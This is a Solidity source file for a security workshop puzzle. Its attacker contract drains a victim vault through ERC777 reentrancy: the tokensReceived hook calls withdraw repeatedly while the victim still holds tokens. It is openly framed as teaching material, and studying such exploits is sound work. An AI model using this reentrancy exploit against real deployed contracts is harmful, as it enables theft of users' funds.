// SPDX-License-Identifier: GPL-3.0
/**  Do NOT use this code in production **
 __      __       _ _                _____       _       _   _                 
 \ \    / /      (_| |              / ____|     | |     | | (_)                
  \ \  / ___ _ __ _| | ___   __ _  | (___   ___ | |_   _| |_ _  ___  _ __  ___ 
   \ \/ / _ | '__| | |/ _ \ / _` |  \___ \ / _ \| | | | | __| |/ _ \| '_ \/ __|
    \  |  __| |  | | | (_) | (_| |  ____) | (_) | | |_| | |_| | (_) | | | \__ \
     \/ \___|_|  |_|_|\___/ \__, | |_____/ \___/|_|\__,_|\__|_|\___/|_| |_|___/
                             __/ |                                             
                            |___/                                              
                                               
Verilog Solutions Inc. https://www.verilog.solutions
Verilog is a full-stack web3 security firm, covering smart contract auditing, 
validator operations, venture investment, and incubation.
Glad to prepare and present the materials for Game Day Remix in DevConnect Amsterdam!
*/

pragma solidity 0.8.6;
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./interface/IVictim.sol";

/// @title Attacker2
/// @notice Attacker contract for puzzle 2
/// @author Verilog Solutions
contract Attacker2 is IERC777Recipient {
	IVictim public victim;
	IERC20 public token;

	constructor(address victimAddr, address tokenAddr) {
		victim = IVictim(victimAddr);
		token = IERC20(tokenAddr);
	}

	function attack(uint256 amount) external {
		token.transferFrom(msg.sender, address(this), amount);
		token.approve(address(victim), amount);
		victim.deposit(amount);
		victim.withdraw(address(this));
	}

	function tokensReceived(
		address,
		address from,
		address,
		uint256,
		bytes calldata,
		bytes calldata
	) external override {
		// mute the compiler warinings
		// operator;
		// from;
		// to;
		// amount;
		// userData;
		// operatorData;

		if (from != address(victim)) {
			return;
		}
		// 10 ** 18 in value == 1 AGT
		if (token.balanceOf(address(from)) > 1e18) {
			victim.withdraw(address(this));
		}
	}
}
